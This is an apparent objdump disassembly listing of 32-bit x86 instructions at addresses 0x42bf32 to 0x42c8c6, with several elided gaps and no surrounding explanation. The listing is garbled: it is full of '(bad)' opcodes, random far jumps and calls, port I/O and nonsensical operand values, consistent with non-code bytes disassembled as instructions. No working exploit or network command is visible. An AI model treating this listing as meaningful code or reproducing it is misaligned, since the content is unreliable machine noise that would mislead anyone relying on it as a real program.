  42bf32:	sub    ebx,DWORD PTR [ecx+eiz*1+0x14]
  42bf36:	inc    ebp
  42bf37:	mov    BYTE PTR [ebp-0x4a7fecff],dh
  42bf3d:	das    
  42bf3e:	data16 or BYTE PTR [ebx+0x3d],cl
  42bf42:	pop    edi
  42bf43:	pop    edx
  42bf44:	ror    DWORD PTR [ebx-0x7c8ae1f],0x59
  42bf4b:	jp     0x42bfaa
  42bf4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf4e:	mov    eax,DWORD PTR ss:0x123b7f74
  42bf55:	fisub  WORD PTR [edx]
  42bf57:	(bad)  
  42bf58:	jno    0x42beda
  42bf5a:	iret   
  42bf5b:	xchg   ecx,eax
  42bf5c:	mov    cl,0x66
  42bf5e:	fcom   st(6)
  42bf60:	mov    esp,0xbe9e3417
  42bf65:	pop    edx
  42bf66:	mov    esp,0x6e337614
  42bf6b:	mov    ds:0xc5225484,eax
  42bf70:	mov    eax,0xa46b5d12
  42bf75:	loopne 0x42bf51
  42bf77:	xchg   edx,eax
  42bf78:	push   edi
  42bf79:	(bad)  [edx+ebp*8]
  42bf7c:	mov    ebx,0x51f465bd
  42bf81:	repnz aaa 
  42bf83:	mov    ebp,0x586c1de9
  42bf88:	ins    BYTE PTR es:[edi],dx
  42bf89:	and    cl,bl
  42bf8b:	aaa    
  42bf8c:	call   0xa901:0x763351ea
  42bf93:	and    BYTE PTR [ecx+0x7ba8b57f],bl
  42bf99:	fistp  DWORD PTR [edx+edi*4-0x57]
  42bf9d:	xchg   ebx,eax
  42bf9e:	rcl    DWORD PTR [eax],0xa5
  42bfa1:	push   0xffffffcc
  42bfa3:	aad    0x31
  42bfa5:	mov    cl,0xb6
  42bfa8:	xchg   edi,eax
  42bfa9:	pop    ds
  42bfaa:	push   edx
  42bfab:	cmp    eax,0x2c89ad59
  42bfb0:	fst    DWORD PTR [esp+edx*4]
  42bfb3:	stos   BYTE PTR es:[edi],al
  42bfb4:	mov    esp,0xee48c3de
  42bfb9:	sbb    eax,0x3f7d77bc
  42bfbe:	mov    ebx,0x23cd2fd0
  42bfc3:	push   ebp
  42bfc4:	jmp    0xc28dd7b8
  42bfc9:	rcl    DWORD PTR [esi-0x2a2730d1],cl
  42bfcf:	mov    ?,WORD PTR [ebp+0xb359578]
  42bfd5:	jb     0x42bf93
  42bfd7:	in     al,0xc8
  42bfd9:	jns    0x42bf92
  42bfdb:	sti    
  42bfdc:	stc    
  42bfdd:	adc    DWORD PTR [ebx+0x7e],esp
  42bfe0:	pop    ecx
  42bfe1:	ins    DWORD PTR es:[edi],dx
  42bfe2:	push   ss
  42bfe3:	(bad)  
  42bfe4:	pop    esi
  42bfe5:	cmp    ch,al
  42bfe7:	jp     0x42bfd1
  42bfe9:	sub    eax,0x1f6a59d8
  42bfee:	inc    ebx
  42bfef:	sub    eax,0x4411d58c
  42bff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bff5:	xor    ch,0x21
  42bff8:	jmp    0x9dda:0xe52e2167
  42bfff:	xor    BYTE PTR [esi],dl
  42c001:	imul   ecx,DWORD PTR [ecx+0x3f83aae2],0xffffff85
  42c008:	fstp   TBYTE PTR [edx-0x7f]
  42c00b:	jl     0x42bfc2
  42c00d:	inc    esi
  42c00e:	sub    eax,0xa6
	...
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	mov    es,WORD PTR [edx-0x7a]
  42c083:	or     eax,esp
  42c085:	(bad)  
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	out    dx,eax
  42c08d:	test   al,0x86
  42c08f:	xlat   BYTE PTR ds:[ebx]
  42c090:	stc    
  42c091:	inc    edx
  42c092:	loop   0x42c0b6
  42c094:	jp     0x42c041
  42c096:	pop    edx
  42c097:	sti    
  42c098:	push   ebx
  42c099:	stc    
  42c09a:	retf   
  42c09b:	sti    
  42c09c:	(bad)  
  42c09d:	dec    esi
  42c09e:	mov    ebx,0x4477e27d
  42c0a3:	pop    ecx
  42c0a5:	lods   eax,DWORD PTR ds:[esi]
  42c0a6:	fsubr  DWORD PTR cs:[esi+0x26]
  42c0aa:	sub    BYTE PTR [edi+0x1e],ah
  42c0ad:	pop    esp
  42c0ae:	push   0x44
  42c0b0:	and    ch,ch
  42c0b2:	(bad)  
  42c0b3:	jbe    0x42c077
  42c0b5:	add    eax,0x8a58ed
  42c0ba:	add    edi,DWORD PTR [ebx]
  42c0bc:	dec    esi
  42c0bd:	jmp    0xfae1:0x8c0651c9
  42c0c4:	adc    DWORD PTR [ebx],edx
  42c0c6:	mov    al,ds:0x48e58698
  42c0cb:	pop    ebp
  42c0cc:	icebp  
  42c0cd:	adc    al,0x8
  42c0cf:	iret   
  42c0d0:	scas   al,BYTE PTR es:[edi]
  42c0d1:	or     ecx,edx
  42c0d3:	popf   
  42c0d4:	adc    DWORD PTR [esi],0x6790a289
  42c0da:	xchg   ebx,eax
  42c0db:	arpl   WORD PTR [ebx-0x40],si
  42c0de:	clc    
  42c0df:	mov    esi,eax
  42c0e1:	fidivr DWORD PTR [edi+0x23440965]
  42c0e7:	sub    al,0xd9
  42c0e9:	imul   esi,DWORD PTR [edx-0x1b],0xffffff82
  42c0ed:	xchg   esi,eax
  42c0ee:	mov    WORD PTR [edx+ebx*1+0x4f77e6d8],ss
  42c0f5:	cmp    bl,0x16
  42c0f8:	lods   al,BYTE PTR ds:[esi]
  42c0f9:	enter  0x74f9,0x3d
  42c0fd:	cdq    
  42c0fe:	push   edx
  42c0ff:	pop    edx
  42c100:	adc    al,0xc3
  42c102:	jl     0x42c15d
  42c104:	dec    ebx
  42c105:	fwait
  42c106:	or     DWORD PTR [edi],ebx
  42c108:	(bad)  
  42c10a:	fld    TBYTE PTR [edx+0xfbb399b]
  42c110:	enter  0x8d32,0x15
  42c114:	xchg   edi,eax
  42c115:	or     DWORD PTR [esi],0x5f207983
  42c11b:	addr16 call 0xbb8e:0x6bd24564
  42c123:	pop    es
  42c124:	and    eax,edi
  42c126:	pop    ecx
  42c127:	out    dx,al
  42c128:	pop    eax
  42c129:	and    esp,esi
  42c12b:	inc    ebp
  42c12c:	dec    eax
  42c12d:	xor    BYTE PTR [esi-0x7b],ah
  42c130:	dec    ebx
  42c131:	push   esp
  42c132:	mov    edx,0x9f90a514
  42c137:	ins    BYTE PTR es:[edi],dx
  42c138:	fmul   QWORD PTR [ebx+0x215aaddd]
  42c13e:	nop
  42c13f:	sbb    DWORD PTR [ebp-0xc114ee8],esp
  42c145:	jbe    0x42c139
  42c147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c148:	bound  eax,QWORD PTR [eax-0x6f7187d2]
  42c14e:	lahf   
  42c14f:	mov    edi,DWORD PTR [edi+0x43]
  42c152:	sbb    dh,BYTE PTR [eax]
  42c154:	je     0x42c15f
  42c156:	fstp   QWORD PTR [edx+0x43cdc60f]
  42c15c:	ret    
  42c15d:	imul   eax,DWORD PTR [ebx],0xe6cd8b56
  42c163:	stos   BYTE PTR es:[edi],al
  42c164:	sbb    ebp,esi
  42c166:	xor    DWORD PTR [ecx+0x698cdfed],edx
  42c16c:	pop    edi
  42c16d:	xchg   DWORD PTR ds:0x818eac58,ebp
  42c173:	daa    
  42c174:	inc    edi
  42c175:	mov    cl,0x0
  42c177:	inc    esp
  42c178:	test   DWORD PTR [ebx-0x2b],ebx
  42c17b:	(bad)  
  42c17c:	iret   
  42c17d:	inc    ecx
  42c17e:	into   
  42c17f:	inc    edx
  42c180:	jne    0x42c1cc
  42c182:	arpl   dx,cx
  42c184:	int3   
  42c185:	pop    eax
  42c187:	cwde   
  42c188:	push   0x4b
  42c18a:	leave  
  42c18b:	shl    edx,cl
  42c18d:	fld    TBYTE PTR [edx+0x3d]
	...
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	add    eax,0xe43d8357
  42c205:	xlat   BYTE PTR ds:[ebx]
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	mov    cs,WORD PTR [edi+0x5d]
  42c20f:	das    
  42c210:	arpl   ax,ax
  42c212:	inc    ebp
  42c213:	add    DWORD PTR [ecx+eiz*8-0x420f98e5],0x10a68bd2
  42c21e:	arpl   WORD PTR [esp+ebp*2],di
  42c221:	fcom   st(1)
  42c223:	ds add al,0x2
  42c226:	xchg   esi,eax
  42c227:	mov    al,0x60
  42c229:	test   BYTE PTR [ebx+0x7e20573b],ch
  42c22f:	outs   dx,BYTE PTR ds:[esi]
  42c230:	push   ebx
  42c231:	mov    eax,ds:0xb0688fcf
  42c236:	sbb    dl,bh
  42c238:	sbb    eax,0x5dcc622a
  42c23d:	popa   
  42c23e:	(bad)  
  42c23f:	out    dx,eax
  42c240:	xor    ebx,DWORD PTR [eax-0x5140180a]
  42c246:	adc    al,0xfa
  42c248:	dec    ecx
  42c249:	jno    0x42c24f
  42c24b:	sbb    DWORD PTR [edi+0x35],0x59
  42c24f:	mov    edi,0xdc729a4a
  42c254:	sbb    eax,0xcf04b2e5
  42c259:	aam    0xa4
  42c25b:	xor    edi,edi
  42c25d:	mov    ds:0x6db6fb57,al
  42c262:	xchg   edi,eax
  42c263:	scas   eax,DWORD PTR es:[edi]
  42c264:	inc    ebx
  42c265:	inc    esi
  42c266:	sub    esi,0xeba86d50
  42c26c:	mov    al,0xda
  42c26e:	jno    0x42c258
  42c270:	(bad)  
  42c271:	daa    
  42c272:	and    DWORD PTR [ecx+edx*8+0x2deda9ae],esi
  42c279:	daa    
  42c27a:	or     BYTE PTR [esi+0x4a],0xc0
  42c27e:	loopne 0x42c267
  42c280:	int    0x1
  42c282:	aaa    
  42c283:	pop    edx
  42c284:	or     DWORD PTR [eax-0x4f],eax
  42c287:	imul   ebp,ecx,0xffffffc8
  42c28a:	sti    
  42c28b:	scas   al,BYTE PTR es:[edi]
  42c28c:	sbb    al,BYTE PTR [ebx-0x27efacb4]
  42c292:	sub    eax,0xcc318bc
  42c297:	dec    edi
  42c298:	sbb    dl,BYTE PTR [ecx]
  42c29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c29b:	and    al,0x52
  42c29d:	xchg   esi,eax
  42c29e:	pop    ebx
  42c29f:	hlt    
  42c2a0:	fnstsw WORD PTR [ecx]
  42c2a2:	popa   
  42c2a3:	in     eax,dx
  42c2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2a5:	and    BYTE PTR es:[ecx],dl
  42c2a8:	into   
  42c2a9:	stos   BYTE PTR es:[edi],al
  42c2aa:	sub    DWORD PTR [edi+0x7c],edi
  42c2ad:	cmp    DWORD PTR [esi-0x23],ebp
  42c2b0:	jb     0x42c317
  42c2b2:	call   0x5db370a9
  42c2b7:	lods   al,BYTE PTR ds:[esi]
  42c2b8:	push   es
  42c2b9:	mov    esp,0xe5e9d286
  42c2be:	push   ebx
  42c2bf:	jmp    0x42c340
  42c2c1:	mov    al,0xd0
  42c2c3:	jmp    0x176b:0xe68e71b6
  42c2ca:	jns    0x42c2e2
  42c2cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2cd:	fisttp DWORD PTR [edx+0x23]
  42c2d0:	es jo  0x42c2ec
  42c2d3:	xor    al,0xd5
  42c2d5:	ficomp DWORD PTR [ebp-0x2c]
  42c2d8:	and    bh,BYTE PTR [edx-0x3d0cca6c]
  42c2de:	and    al,0xc1
  42c2e0:	pop    ecx
  42c2e1:	pop    esi
  42c2e2:	lahf   
  42c2e3:	stos   BYTE PTR es:[edi],al
  42c2e4:	js     0x42c26f
  42c2e6:	stos   BYTE PTR es:[edi],al
  42c2e7:	inc    ebp
  42c2e8:	mov    bl,0xd7
  42c2ea:	jbe    0x42c31c
  42c2ec:	(bad)  
  42c2ed:	pop    ss
  42c2ee:	and    eax,0xd4226e7f
  42c2f3:	lock stos BYTE PTR es:[edi],al
  42c2f5:	jg     0x42c2bd
  42c2f7:	out    0xa9,al
  42c2f9:	repz add bl,BYTE PTR [esi-0x3d]
  42c2fd:	lods   al,BYTE PTR ds:[esi]
  42c2fe:	mov    esp,0x659d5850
  42c303:	add    DWORD PTR [esi-0x80],edi
  42c306:	cmc    
  42c307:	mov    dh,0x9f
  42c309:	xor    eax,0xbb85ee87
  42c30e:	jmp    0x0:0x6f
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xf61c46f6
  42c383:	jno    0x42c36d
  42c385:	fadd   DWORD PTR [ecx]
  42c387:	add    BYTE PTR [ecx+eax*1],al
  42c38a:	add    BYTE PTR [eax],al
  42c38c:	sub    DWORD PTR [ebp-0x27],ebx
  42c38f:	ins    DWORD PTR es:[edi],dx
  42c390:	add    al,0x98
  42c392:	xor    eax,0x611141bb
  42c397:	test   BYTE PTR [eax+0x78],0xfe
  42c39b:	sub    cl,ah
  42c39d:	adc    edi,ecx
  42c39f:	repnz pop edx
  42c3a1:	pshufw mm6,mm2,0x44
  42c3a5:	(bad)  
  42c3a7:	ret    
  42c3a8:	mov    ebx,0x4150c84e
  42c3ad:	push   edi
  42c3ae:	outs   dx,DWORD PTR ds:[esi]
  42c3af:	pop    eax
  42c3b0:	shl    DWORD PTR [ebx+eax*2+0x36acc4ef],1
  42c3b7:	maskmovq mm2,(bad)
  42c3b8:	not    DWORD PTR [edx-0x5e]
  42c3bb:	out    dx,al
  42c3bc:	je     0x42c439
  42c3be:	jnp    0x42c43b
  42c3c0:	retf   0xe37d
  42c3c3:	popf   
  42c3c4:	jl     0x42c437
  42c3c6:	mov    ds:0x4981e4a4,eax
  42c3cb:	int3   
  42c3cc:	int3   
  42c3cd:	add    cl,BYTE PTR [edi]
  42c3cf:	sub    eax,DWORD PTR [edi]
  42c3d1:	dec    edi
  42c3d2:	fwait
  42c3d3:	pop    esp
  42c3d4:	dec    ebp
  42c3d5:	stos   DWORD PTR es:[edi],eax
  42c3d6:	add    al,0x7
  42c3d8:	outs   dx,BYTE PTR ds:[esi]
  42c3d9:	push   cs
  42c3da:	dec    edi
  42c3db:	pop    esi
  42c3dc:	enter  0x1323,0xff
  42c3e0:	and    bl,BYTE PTR [eax-0x6b]
  42c3e3:	add    ebp,DWORD PTR [edi+esi*4+0x423352d0]
  42c3ea:	repz aad 0xbb
  42c3ed:	rcr    BYTE PTR [ecx-0x653d8281],0xc4
  42c3f4:	mov    cl,0xfc
  42c3f6:	mov    dl,0x39
  42c3f8:	add    DWORD PTR ss:[ebp+0x28],esp
  42c3fc:	xor    eax,0xdd8b71a8
  42c401:	shr    BYTE PTR [ecx],0xb8
  42c404:	pop    ebx
  42c405:	(bad)  
  42c407:	fcom   QWORD PTR [edi+ecx*1]
  42c40a:	add    eax,0xd2c549bd
  42c40f:	test   DWORD PTR [edx],edx
  42c411:	f2xm1  
  42c413:	inc    ecx
  42c414:	jp     0x42c3f7
  42c416:	cmp    edi,DWORD PTR fs:[ebp-0x2d6e045e]
  42c41d:	mov    ecx,gs
  42c41f:	push   edi
  42c420:	adc    ch,BYTE PTR [edi]
  42c422:	aad    0x0
  42c424:	je     0x42c3b6
  42c426:	icebp  
  42c427:	dec    esp
  42c428:	pop    esp
  42c429:	pop    eax
  42c42a:	mov    esp,0x5c13a4f1
  42c42f:	inc    edi
  42c430:	jmp    0x375c:0x31207ae4
  42c437:	xchg   edi,eax
  42c438:	xchg   ebp,eax
  42c439:	mov    ?,WORD PTR [ecx-0x27f7f95b]
  42c43f:	add    DWORD PTR [ebx-0x3c25c497],ebx
  42c445:	push   ebp
  42c447:	jp     0x42c3f5
  42c449:	repz mov ebp,edx
  42c44c:	fbstp  TBYTE PTR [esi]
  42c44e:	pop    es
  42c44f:	rcr    DWORD PTR [ecx+0x42],1
  42c452:	push   eax
  42c453:	adc    dh,BYTE PTR [edx-0x120f558a]
  42c459:	mov    esi,0xf64d36ea
  42c45e:	inc    ecx
  42c45f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c460:	pop    eax
  42c461:	and    dh,BYTE PTR [ecx+ecx*2]
  42c464:	push   es
  42c465:	imul   ebp,DWORD PTR [esi+esi*1],0x7
  42c469:	popf   
  42c46a:	push   esp
  42c46b:	sar    BYTE PTR [edi],cl
  42c46d:	sti    
  42c46e:	lds    esp,FWORD PTR [edi]
  42c470:	xor    eax,0x7804eeca
  42c475:	retf   0xb215
  42c478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c479:	jle    0x42c469
  42c47b:	xchg   esp,eax
  42c47c:	dec    ecx
  42c47d:	dec    BYTE PTR [ecx]
  42c47f:	jmp    0xedaa59d5
  42c484:	cmp    BYTE PTR [ecx],0xb7
  42c487:	pop    ebp
  42c488:	sub    ch,dl
  42c48a:	jns    0x42c473
  42c48c:	mov    DWORD PTR [ebx],eax
  42c48e:	push   ebx
  42c48f:	push   esi
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xed34,0xbf
  42c502:	icebp  
  42c503:	shr    esp,cl
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	adc    eax,0xed926542
  42c511:	inc    esi
  42c512:	xchg   DWORD PTR [ebx],ebp
  42c514:	xchg   ebp,eax
  42c515:	mov    dh,0x7a
  42c517:	jae    0x42c53d
  42c519:	xor    dh,cl
  42c51b:	xchg   edx,eax
  42c51c:	test   al,0x8c
  42c51e:	ret    
  42c51f:	jg     0x42c556
  42c521:	fistp  DWORD PTR [eax-0x58]
  42c524:	mov    al,0x18
  42c526:	daa    
  42c527:	xor    BYTE PTR [ecx-0x33de132c],bl
  42c52d:	rol    edi,0x4f
  42c530:	dec    ecx
  42c531:	dec    ebp
  42c532:	js     0x42c50f
  42c534:	cs cwde 
  42c536:	pop    ebp
  42c537:	cmp    BYTE PTR ds:0xba3ad333,dh
  42c53d:	fnstenv [ecx+0x76]
  42c540:	and    al,0x2b
  42c542:	and    BYTE PTR [edi],bh
  42c544:	test   al,0x18
  42c546:	mov    eax,0x90f72bfe
  42c54b:	pushf  
  42c54c:	sub    eax,0xdd60ad83
  42c551:	sbb    al,BYTE PTR [esi+ebx*1]
  42c554:	inc    ecx
  42c555:	mov    dh,0xb4
  42c557:	scas   al,BYTE PTR es:[edi]
  42c558:	or     DWORD PTR [edx+0x3],eax
  42c55b:	mov    edx,0xebbbb14
  42c560:	in     eax,0xde
  42c562:	and    BYTE PTR gs:[edx+0x1b13477b],0x57
  42c56a:	fs jae 0x42c4f8
  42c56d:	dec    esp
  42c56e:	jns    0x42c509
  42c570:	pop    esp
  42c571:	loop   0x42c4fa
  42c573:	test   ebx,edi
  42c575:	xchg   ebp,eax
  42c576:	push   esp
  42c577:	sbb    eax,0xf8c2ffe9
  42c57c:	fiadd  DWORD PTR [esi-0x594190e4]
  42c582:	cmp    DWORD PTR [esi+0x27549711],edx
  42c588:	or     bl,al
  42c58a:	mov    DWORD PTR [edi],ebp
  42c58c:	ins    DWORD PTR es:[edi],dx
  42c58d:	lahf   
  42c58e:	xor    ebx,DWORD PTR [edi+0x785b313f]
  42c594:	xlat   BYTE PTR ds:[ebx]
  42c595:	and    al,0xf
  42c597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c598:	adc    dh,cl
  42c59a:	ja     0x42c5ce
  42c59c:	(bad)  
  42c59d:	jge    0x42c5f5
  42c59f:	push   0xffffffc3
  42c5a1:	mov    al,ds:0xd5a94d59
  42c5a6:	and    al,0x33
  42c5a8:	mov    al,ds:0x2e1ee3d4
  42c5ad:	pop    edx
  42c5ae:	jns    0x42c5b0
  42c5b0:	out    0x84,al
  42c5b2:	jb     0x42c605
  42c5b4:	(bad)
  42c5b7:	or     esp,edx
  42c5b9:	test   ch,cl
  42c5bb:	adc    al,BYTE PTR [ebp-0x3c112562]
  42c5c1:	out    0x62,al
  42c5c3:	inc    edx
  42c5c5:	cmp    eax,DWORD PTR [eax+0x56d3e039]
  42c5cb:	xor    eax,0x67fb3c05
  42c5d0:	bnd jge 0x42c5c0
  42c5d3:	mov    al,0xd7
  42c5d5:	loope  0x42c59c
  42c5d7:	mov    cl,0xf5
  42c5d9:	popa   
  42c5da:	jle    0x42c64e
  42c5dc:	out    dx,eax
  42c5dd:	lock xchg ebx,eax
  42c5df:	js     0x42c629
  42c5e1:	dec    ebp
  42c5e2:	adc    ch,BYTE PTR [ecx+0x53]
  42c5e5:	inc    ebp
  42c5e6:	mov    al,BYTE PTR [eax]
  42c5e8:	jae    0x42c5c2
  42c5ea:	lock pop ecx
  42c5ec:	dec    DWORD PTR [esi-0x4036fa5c]
  42c5f2:	jge    0x42c5f9
  42c5f4:	mov    esp,0xbd810f68
  42c5f9:	jb     0x42c64d
  42c5fb:	push   ecx
  42c5fc:	dec    esi
  42c5fd:	inc    esp
  42c5fe:	data16 mov WORD PTR [esi],ss
  42c601:	fbld   TBYTE PTR ds:0xcc52e7bd
  42c607:	mov    ch,0xe
  42c609:	push   ds
  42c60a:	sar    DWORD PTR [ebx+0x5f],1
  42c60d:	outs   dx,DWORD PTR ds:[esi]
  42c60e:	sbb    al,0xa1
	...
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x706dfc6b]
  42c681:	xlat   BYTE PTR ds:[ebx]
  42c682:	ret    0xf08c
  42c685:	fiadd  DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	mov    ebx,DWORD PTR [ebx+0x61d1465d]
  42c692:	lahf   
  42c693:	mov    bl,0xab
  42c695:	loopne 0x42c6d1
  42c697:	jne    0x42c6cf
  42c699:	repnz adc DWORD PTR [ecx+0x3e],ebx
  42c69d:	xor    ch,BYTE PTR [edx+0x4a]
  42c6a0:	int    0x5a
  42c6a2:	adc    eax,0xb86b094
  42c6a7:	(bad)  
  42c6a8:	retf   
  42c6a9:	bound  ecx,QWORD PTR [ebx+0x418fe10c]
  42c6af:	das    
  42c6b0:	aam    0xea
  42c6b2:	xchg   ebp,eax
  42c6b3:	cmp    ecx,DWORD PTR [esi+0x2cb46551]
  42c6b9:	xor    eax,0xbb4465d0
  42c6be:	sbb    al,0xb6
  42c6c0:	mov    cl,0xe5
  42c6c2:	sub    eax,0xd108eb33
  42c6c7:	repz retf 
  42c6c9:	imul   esp,edi,0xffffffa5
  42c6cc:	mov    ?,WORD PTR [esi]
  42c6ce:	icebp  
  42c6cf:	fstp   TBYTE PTR [di]
  42c6d2:	cmp    dl,BYTE PTR [ecx]
  42c6d4:	js     0x42c719
  42c6d6:	push   eax
  42c6d7:	jl     0x42c73a
  42c6d9:	xor    DWORD PTR [edx],0xbe21570c
  42c6df:	jmp    0x42c70d
  42c6e1:	mov    ah,0xab
  42c6e3:	addr16 nop
  42c6e5:	imul   BYTE PTR [eax]
  42c6e7:	cli    
  42c6e8:	scas   al,BYTE PTR es:[edi]
  42c6e9:	cmp    DWORD PTR [ebx],esp
  42c6eb:	rcr    DWORD PTR [edi],0x15
  42c6ee:	or     BYTE PTR [eax+0x6633c75e],0xe4
  42c6f5:	jecxz  0x42c706
  42c6f7:	outs   dx,DWORD PTR ds:[esi]
  42c6f8:	leave  
  42c6f9:	retf   0xf493
  42c6fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c6fd:	adc    esi,ebp
  42c6ff:	ret    
  42c700:	repnz add edi,esi
  42c703:	mov    ebx,0x161b7794
  42c708:	sub    eax,0x40835c5d
  42c70d:	cli    
  42c70e:	xchg   ebx,eax
  42c70f:	cmp    BYTE PTR [ebx],ch
  42c711:	in     eax,0xe6
  42c713:	adc    eax,0x522becb0
  42c718:	jnp    0x42c715
  42c71a:	and    al,0x28
  42c71c:	pop    es
  42c71d:	mov    eax,0xc9738856
  42c722:	mov    WORD PTR ds:0xf4ef6b83,?
  42c728:	cmp    dl,dh
  42c72a:	lea    edi,[esi+0x64]
  42c72d:	cwde   
  42c72e:	mul    BYTE PTR [esi+0x7c]
  42c731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c732:	scas   eax,DWORD PTR es:[edi]
  42c733:	fwait
  42c734:	sub    ch,BYTE PTR [edx-0x6fe574ca]
  42c73a:	jnp    0x42c78b
  42c73c:	jp     0x42c6e9
  42c73e:	or     ch,dh
  42c740:	in     al,0xc9
  42c742:	dec    ecx
  42c743:	add    ebx,DWORD PTR [ebp+0x3f]
  42c746:	xchg   edi,eax
  42c747:	mov    al,0xbd
  42c749:	dec    ebp
  42c74a:	arpl   WORD PTR [edi],bp
  42c74c:	(bad)  
  42c74d:	push   ds
  42c74e:	mov    ds:0x400c3737,al
  42c753:	retf   
  42c754:	ret    0x7686
  42c757:	fadd   QWORD PTR [ecx+0x7d5a1cce]
  42c75d:	push   edx
  42c75e:	xor    eax,DWORD PTR [ecx+0xbba7d37]
  42c764:	xor    bl,BYTE PTR [esi-0x7fd40bc6]
  42c76a:	mov    WORD PTR [edi],ss
  42c76c:	mov    cl,0xd2
  42c76e:	fist   DWORD PTR [edi]
  42c770:	dec    ecx
  42c771:	adc    eax,0x34a242ab
  42c776:	(bad)  
  42c777:	out    dx,al
  42c778:	dec    ebx
  42c779:	dec    ecx
  42c77a:	out    dx,al
  42c77b:	jl     0x42c77c
  42c77d:	repnz mov ebx,0x6e6bc367
  42c783:	or     al,BYTE PTR [edi+0x4bcf5648]
  42c789:	(bad)  
  42c78a:	aas    
  42c78b:	lea    ebx,[esi+0xe0f6fb]
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0x3812a40e
  42c802:	das    
  42c803:	mov    ecx,0x1dbf4
  42c808:	add    al,0x1
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	add    eax,DWORD PTR [esi-0x4a]
  42c80f:	jge    0x42c843
  42c811:	sub    al,0x5c
  42c813:	push   ss
  42c814:	push   esi
  42c815:	stos   DWORD PTR es:[edi],eax
  42c816:	daa    
  42c817:	pop    ecx
  42c818:	out    0xd5,al
  42c81a:	ja     0x42c881
  42c81c:	mov    eax,0xa2fc4b7
  42c821:	dec    edi
  42c822:	adc    DWORD PTR [eax],ebx
  42c824:	jno    0x42c7fd
  42c826:	mov    ecx,0x4b3c965c
  42c82b:	jb     0x42c7fc
  42c82d:	pop    ecx
  42c82e:	adc    ah,BYTE PTR [ecx+0x2829700]
  42c834:	xchg   edx,eax
  42c835:	mov    eax,ds:0x36367935
  42c83a:	or     eax,0x5c278248
  42c83f:	xor    al,0xd7
  42c841:	sub    bl,dl
  42c843:	inc    eax
  42c844:	jecxz  0x42c80e
  42c846:	sub    DWORD PTR [ecx+ecx*1-0x53f4368],esp
  42c84d:	mov    dh,0xd6
  42c84f:	imul   esp,DWORD PTR [ebx+0x61387c89],0x3c
  42c856:	jbe    0x42c873
  42c858:	scas   al,BYTE PTR es:[edi]
  42c859:	out    0x3e,al
  42c85b:	es aaa 
  42c85d:	inc    edi
  42c85e:	or     BYTE PTR [eax+0x7bb87170],ch
  42c864:	jo     0x42c85e
  42c866:	or     BYTE PTR [edx+edi*8],ch
  42c869:	cs inc eax
  42c86b:	cdq    
  42c86c:	adc    bl,bh
  42c86e:	mov    eax,0x1f1895fe
  42c873:	(bad)  
  42c874:	mov    ecx,0x72bd706e
  42c879:	stos   BYTE PTR es:[edi],al
  42c87a:	jg     0x42c84e
  42c87c:	retf   
  42c87d:	imul   eax,DWORD PTR [ebx+0x7b],0x92ff456c
  42c884:	repz mov esp,0x7ff29652
  42c88a:	cmc    
  42c88b:	jmp    0x231ec654
  42c890:	dec    esi
  42c891:	jge    0x42c87e
  42c893:	inc    esi
  42c894:	push   DWORD PTR [ecx+0x5a]
  42c897:	mov    bh,ah
  42c899:	mov    ah,0x1c
  42c89b:	cmp    al,0xda
  42c89d:	xor    eax,0x75b01282
  42c8a2:	sub    esp,esi
  42c8a4:	scas   al,BYTE PTR es:[edi]
  42c8a5:	nop
  42c8a6:	lea    ebx,[ebx-0x286296ad]
  42c8ac:	jb     0x42c82e
  42c8ae:	mov    ah,0x81
  42c8b0:	stc    
  42c8b1:	xor    eax,0x7c25e13d
  42c8b6:	mov    ch,0x4c
  42c8b8:	(bad)  [ebp+esi*1+0xe]
  42c8bc:	aas    
  42c8bd:	das    
  42c8be:	adc    DWORD PTR [ecx-0x67bdf577],edx
  42c8c4:	loopne 0x42c93d
  42c8c6:	out    0xdb,eax
